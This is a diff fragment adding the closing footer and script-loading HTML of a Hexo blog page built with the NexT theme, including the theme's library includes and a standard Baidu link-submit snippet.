+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">e3pem</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
